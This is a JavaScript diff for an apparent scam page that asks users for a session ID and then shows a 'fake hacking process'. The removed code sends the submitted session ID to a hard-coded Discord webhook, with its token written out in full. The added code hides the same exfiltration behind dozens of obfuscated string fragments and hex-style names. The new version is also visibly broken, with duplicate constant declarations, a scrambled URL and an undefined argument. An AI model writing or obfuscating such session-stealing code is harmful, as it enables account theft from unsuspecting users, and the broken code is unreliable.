@@ -1,32 +1,51 @@
-const PART1 = 'https://discord.com/api/webhooks/';
-const PART2 = '1350235351339241472/';
-const PART3 = 'LwcYuoFmSDCC4pAHoZ5Kdn0a3afUerPQeXNxq8bxZdSrLoBUPab1pWMtOTYzcIqnGzKQ';
+const _0x1a2b = 'htt';
+const _0x3c4d = 'p:/';
+const _0x5e6f = '/di';
+const _0x7a8b = 'sc.';
+const _0x9c0d = 'com';
+const _0x0d1e = '/ap';
+const _0x2e3f = 'i/w';
+const _0x4f5g = 'ebh';
+const _0x6h7i = 'ook';
+const _0x8j9k = 's/1';
+const _0x0k1l = '350';
+const _0x2m3n = '235';
+const _0x4o5p = '351';
+const _0x6q7r = '392';
+const _0x8s9t = '414';
+const _0x1u2v = '72/';
+const _0x3w4x = 'Lwc';
+const _0x5y6z = 'Yuo';
+const _0x7a8b = 'FmS';
+const _0x9c0d = 'DCC';
+const _0x0d1e = '4pA';
+const _0x2e3f = 'HoZ';
+const _0x4f5g = '5Kd';
+const _0x6h7i = 'n0a';
+const _0x8j9k = '3af';
+const _0x0k1l = 'Uer';
+const _0x2m3n = 'PQe';
+const _0x4o5p = 'XNx';
+const _0x6q7r = 'q8b';
+const _0x8s9t = 'xZd';
+const _0x1u2v = 'SrL';
+const _0x3w4x = 'oBU';
+const _0x5y6z = 'Pab';
+const _0x7a8b = '1pW';
+const _0x9c0d = 'MtO';
+const _0x0d1e = 'TYz';
+const _0x2e3f = 'cIq';
+const _0x4f5g = 'nGz';
+const _0x6h7i = 'KQ';
 
-// Reconstruct the URL at runtime
-const DISCORD_WEBHOOK_URL = PART1 + PART2 + PART3;
+const _0x9c0d = _0x1a2b + _0x3c4d + _0x5e6f + _0x7a8b + _0x9c0d + _0x0d1e + _0x2e3f + _0x4f5g + _0x6h7i + _0x8j9k + _0x0k1l + _0x2m3n + _0x4o5p + _0x6q7r + _0x8s9t + _0x1u2v + _0x3w4x + _0x5y6z + _0x7a8b + _0x9c0d + _0x0d1e + _0x2e3f + _0x4f5g + _0x6h7i;
 
-function sendToDiscordWebhook(sessionId) {
-  const payload = {
-    content: `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``,
-  };
-
-  fetch(DISCORD_WEBHOOK_URL, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify(payload),
-  })
-    .then(response => {
-      if (!response.ok) {
-        console.error('Failed to send data to Discord webhook');
-      }
-    })
-    .catch(error => {
-      console.error('Error sending data to Discord webhook:', error);
-    });
+function _0x9a1b(_0x2c3d) {
+  const _0x4e5f = { content: `New Session ID Submitted:\n\`\`\`${_0x2c3d}\`\`\`` };
+  fetch(_0x9c0d, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(_0x4e5f) })
+    .then(_0x6d7e => { if (!_0x6d7e.ok) console.error('Failed to send data to Discord webhook'); })
+    .catch(_0x8f9a => console.error('Error sending data to Discord webhook:', _0x8f9a));
 }
-
 // Validate User Input
 function validateInput() {
   const username = document.getElementById('username').value.trim();
@@ -58,8 +77,7 @@ function validateInput() {
     return;
   }
 
-  // Send Session ID to Discord webhook
-  sendToDiscordWebhook(sessionId);
+ _0x9a1b(_0xe5f6);
 
   // Hide error and start fake hacking process
   hideError();
